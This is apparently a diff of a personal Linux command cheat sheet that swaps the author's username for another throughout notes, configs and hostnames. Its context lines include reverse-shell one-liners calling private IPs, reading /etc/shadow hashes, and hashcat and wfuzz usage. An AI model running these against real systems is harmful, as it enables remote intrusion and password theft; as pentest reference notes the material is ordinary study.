@@ -139,7 +139,7 @@ chroot /mnt/mntdrive /bin/bash                                                  
 
 
 [ tar ]
-[malhyari fix this with tar documents]
+[linus fix this with tar documents]
 
 tar -xf file.name.tar -C /path/to/directory
 tar -zxvf file-name.tar.gz                                                      ** Extract and decompress
@@ -411,7 +411,7 @@ root@userver:~$ if [ -e dec.key ]; then
 > fi
 
                                                                                 ** Numeric Comparison
-[malhyari fix bash numeric comparison]
+[linus fix bash numeric comparison]
 N1 -eq N2
 N1 -ge N2
 N1 -gt N2
@@ -767,7 +767,7 @@ ps -auxww                                                                       
 [ Installing custom packages ]
 
 reloved directory for installing custom softwares is /opt
-[malhyari delete this one]
+[linus delete this one]
 
 add the installation path to your path variable
 add it to the end, if there is a binary conflict it will always choose original one.
@@ -831,7 +831,7 @@ fdisk /dev/sda                                                                  
 [ mount ]
 mount /dev/sda1 /home
 umount /dev/sda1
-[malhyari check for duplicates and add explanations if needed]
+[linus check for duplicates and add explanations if needed]
 
 
 
@@ -849,7 +849,7 @@ systemctl poweroff                                                              
 systemctl suspend                                                               ** suspend the system
 
 
-[malhyari check for duplicates]
+[linus check for duplicates]
 
 [ init.d ]
 
@@ -927,7 +927,7 @@ iptables -t nat  -A PREROUTING -i eth0 -p tcp --dport 9090 -j DNAT --to 10.113.1
 
 
 [samba client/ smbclient]
-[malhyari check for duplicates]
+[linus check for duplicates]
 
 smbclient -L host                                                               ** See which shares are available on a given host.
 smbclient -U [username] -L host                                                 ** Specifies the username
@@ -1341,7 +1341,7 @@ dig @4.2.2.2 www.cisco.com a
 
 
 OR dig -t mx google.com
-dig -t any google.com                                                           ** request all records [malhyari updated from hard source]
+dig -t any google.com                                                           ** request all records [linus updated from hard source]
 
 
 reverse look for an ip
@@ -1539,7 +1539,7 @@ i686-w64-mingw32-gcc [input file: source] -o [output file: .exe] -lws2_32
 
 [ add a static route via ip route ]
 ip route add 10.1.0.0/16  via 10.11.0.1 dev tap0
-[malhyari consildate new ip tool section]
+[linus consildate new ip tool section]
 
 [ mysql ]
 
@@ -1681,7 +1681,7 @@ ls /usr/share/webshells/
 
 [ strace  ]
 strace -f                                                                       ** Trace the system calls for an executable
-[malhyari possibility of merge with a main strace section]
+[linus possibility of merge with a main strace section]
 
 
 
@@ -1805,19 +1805,19 @@ $ getfattr -n user.comment testfile
 # file: testfile
 user.comment="this is a comment"
 
-[malhyari check for adding the rest of the extended attributes]
+[linus check for adding the rest of the extended attributes]
 
 
 
 [ hashid ]
                                                                                 ** Identify the hash in the file on linux
-└─# cat /etc/shadow | grep malhyari | cut -d : -f2 | hashid
+└─# cat /etc/shadow | grep linus | cut -d : -f2 | hashid
 
 [ hashcat ]
                                                                                 ** Password cracking tool that relies on gpu
 hashcat -m 10 -a 0 pass /usr/share/wordlists/rockyou.txt
 
-[malhyari please add more details on hashcat]
+[linus please add more details on hashcat]
 
 
 
@@ -1851,7 +1851,7 @@ $ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php
 [ reverse shells ]
 
 /bin/nc.traditional -c /bin/bash 192.168.6.122 33666
-[malhyari merge with the other reverse shells section]
+[linus merge with the other reverse shells section]
 
 
 bash -i >& /dev/tcp/192.168.33.129/4444 0>&1
@@ -2452,7 +2452,7 @@ $ diff a.txt b.txt
                                                                                 The three dashes (“—“) merely separate the lines of file 1 and file 2.
 
 
-[malhyari fix this with more details ]
+[linus fix this with more details ]
 
 
 
@@ -2621,7 +2621,7 @@ iface eth0 inet static
 
 
 
-malhyari@ubuntuServer:~$ cat  /etc/netplan/01-netcfg.yaml                       ** ubuntu new style interface config
+linus@ubuntuServer:~$ cat  /etc/netplan/01-netcfg.yaml                       ** ubuntu new style interface config
 
     # This file describes the network interfaces available on your system
     # For more information, see netplan(5).
@@ -3109,7 +3109,7 @@ ssh -6 -i id-rsa test@2001::1
 
 
 ip  -6 neighbors                                                                ** View ipv6 neighbors
-malhyari@ubuntuServer:~$ sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1        ** disable ipv6 on linux
+linus@ubuntuServer:~$ sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1        ** disable ipv6 on linux
 
 
 
@@ -3888,7 +3888,7 @@ parted -l                                                                       
 fsck -a
 fsck -p
 
-[malhyari add more details ]
+[linus add more details ]
 
 
 [ swap partition ]
@@ -4038,13 +4038,13 @@ ip -s link                                                                      
 ip s a | grep up                                                                ** Check if interfaces are up
 
 
-[malhyari add more details]
+[linus add more details]
 
 
 [ ethtools ]
  ethtool -S ens32                                                               ** Very detailed output on the interface counters
 
-[malhyari add more details]
+[linus add more details]
 
 
 
@@ -4056,7 +4056,7 @@ iptraf-ng
 [ ntop ]
 
 
-malhyari@ubuntuServer:~$ apt-cache search -n ntop
+linus@ubuntuServer:~$ apt-cache search -n ntop
 diveintopython-zh - free Python book for experienced programmers (zh translation)
 diveintopython3 - book for learning Python 3
 ntopng - High-Speed Web-based Traffic Analysis and Flow Collection Tool
@@ -4069,7 +4069,7 @@ sntop - A curses-based utility that polls hosts to determine connectivity
 runs as a service
 port 3000 /     web interface that can be accessed from another machine /
 
-[malhyari add more]
+[linus add more]
 
 
 [ groups ]
@@ -4103,7 +4103,7 @@ export [variable name]
                                                                                 and less will use those options when you run it. (Many manual pages contain a section marked ENVIRONMENT that describes these variables.)
 
 
-[malhyari possible merge ]
+[linus possible merge ]
 
 
 
@@ -4396,8 +4396,8 @@ chmod g+s .                                                                     
 
 
 [ setuid ]
-[malhyari check for duplicates]
-[malhyari add details ]
+[linus check for duplicates]
+[linus add details ]
 
 
 
@@ -5192,7 +5192,7 @@ lsblk                                                                           
 udevadm info /dev/sdb1                                                          ** QUERY THE DEVICE ATTRIBUTES FROM UDEV DATABASE
 
                                                                                 ** View eth0 udev info:
-malhyari@ubuntu:~$ udevadm info -a -p /sys/class/net/eth0
+linus@ubuntu:~$ udevadm info -a -p /sys/class/net/eth0
 
 
 
@@ -5319,7 +5319,7 @@ master / origin / local / remote
 
 remote repository : is the one on git hub and from which all code flows // it is the origin
 
-[malhyari add explanation]
+[linus add explanation]
 
                                                                                 **set git username and passowrds
 
@@ -5354,7 +5354,7 @@ git push -f origin master
                                                                                 ** create a branch and let the developer work on it and then merge please remember you can roll back too
 
 
-[malhyari add more details]
+[linus add more details]
 
 
 [ linux Configuration Management tools ]
@@ -5481,7 +5481,7 @@ sudo pam_tall2
 
 
                                                                                 ** Unlock a user
-sudo pam_tally2 -u malhyari -r
+sudo pam_tally2 -u linus -r
 
 
 
@@ -5788,13 +5788,13 @@ cat /var/lib/dhcpd/dhcpd.leases
 
                                                                                 ** postfix mail server replacing sendmail old shit
 
-[malhyari add details more ]
+[linus add details more ]
 
 
 
 
 [ slap ]
-malhyari put the details here
+linus put the details here
 
 
 [ dns ]
@@ -5825,9 +5825,9 @@ Known Options :
 
 
 /etc/named.conf
-zone "malhyari.net." IN {
+zone "linus.net." IN {
         type master;
-        file "/etc/named/malhyari.net.zone";
+        file "/etc/named/linus.net.zone";
 };
 
 
@@ -5842,7 +5842,7 @@ named-checkzone example.com. /var/named/example.com.zone
 $TTL 60
 
 
-@                      IN SOA                 server.malhyari.net. admin.malhyari.net.  (
+@                      IN SOA                 server.linus.net. admin.linus.net.  (
                                         2004062602 ; serial
                                         3H        ;refresh
                                         1H        ;retry
@@ -5850,7 +5850,7 @@ $TTL 60
                                         1M)        ;minimum
 
 
-malhyari.net.             IN NS                 server.malhyari.net.
+linus.net.             IN NS                 server.linus.net.
 server                      IN A                10.10.2.40
 ise-nac                     IN A                10.10.2.100
 servicesgateway      IN A                10.10.2.1
@@ -5912,15 +5912,15 @@ nmcli con mod <connectionName> ipv4.dns "8.8.8.8 8.8.4.4"                       
 nmcli  device connect ens33
 nmcli  device disconnect ens33
 
-[malhyari check for duplicates ]
+[linus check for duplicates ]
 
 
 
 [ hostname ]
 
-1)sudo vi /etc/sysconfig/network                                                ** add this line there HOSTNMME=lfce1.malhyari.net
-2) open /etc/hosts                                                              ** 11..1.1 lfce1.malhyari.net lfce1
-3) hostnamectl set-hosntame lfce1.malhyari.net
+1)sudo vi /etc/sysconfig/network                                                ** add this line there HOSTNMME=lfce1.linus.net
+2) open /etc/hosts                                                              ** 11..1.1 lfce1.linus.net lfce1
+3) hostnamectl set-hosntame lfce1.linus.net
 
 
 [ apache ]
@@ -6246,10 +6246,10 @@ http://ip-address
                                                                                 ************************
 
 <VirtualHost *:443>
-    ServerName www.malhyari.net:443
+    ServerName www.linus.net:443
     SSLEngine On
-    SSLCertificateFile /etc/pki/tls/certs/www.malhyari.net.cert
-    SSLCertificateKeyFile /etc/pki/tls/private/www.malhyari.net.key
+    SSLCertificateFile /etc/pki/tls/certs/www.linus.net.cert
+    SSLCertificateKeyFile /etc/pki/tls/private/www.linus.net.key
 </VirtualHost>
 
 
@@ -6505,13 +6505,13 @@ domain url routing
                                                                                 **configuration
 
 http_port 80 accel defaultsite=no-vhost                                         **tells squid to function as a caching reverse proxy for web acceleration
-cache_peer server1.malhyari.net parent 80 0 no-query originserver name=PSReverProxy    **the server to which we do the reverse proxy
+cache_peer server1.linus.net parent 80 0 no-query originserver name=PSReverProxy    **the server to which we do the reverse proxy
 
                                                                                 **function as a reverse proxy
 
 
                                                                                 **open access to the proxy with the access control
-acl demo_Site dstdomain proxy.malhyari.com
+acl demo_Site dstdomain proxy.linus.com
 http_access allow demo_Site
 
 
@@ -6605,8 +6605,8 @@ passwd hacluster
 
                                                                                 ** On one of the nodes
 
-pcs cluster auth server0.malhyari.net server1.malhyari.net -u hacluster -p [password] --force
-pcs cluster setup --name nginxcluster server0.malhyari.net server1.malhyari.net
+pcs cluster auth server0.linus.net server1.linus.net -u hacluster -p [password] --force
+pcs cluster setup --name nginxcluster server0.linus.net server1.linus.net
 
 
                                                                                 ** enable cluster on boot and startup
@@ -6635,7 +6635,7 @@ pcs resource create http_server ocf:heartbeat:nignx configfile="/etc/nginx/nginx
 
 
 [ openldap ]
-[malhyari check for duplicates]
+[linus check for duplicates]
 
 
                                                                                 ** LDAP Server
@@ -7046,7 +7046,7 @@ Volumes:
 3- create a named volume:
 
 -v mysql-db:/var/lib/mysql                                                      **Volume labels
--v /home/malhyari:/home/alex                                                    **Bind mounts
+-v /home/linus:/home/alex                                                    **Bind mounts
 
 
 Docker Volume Create
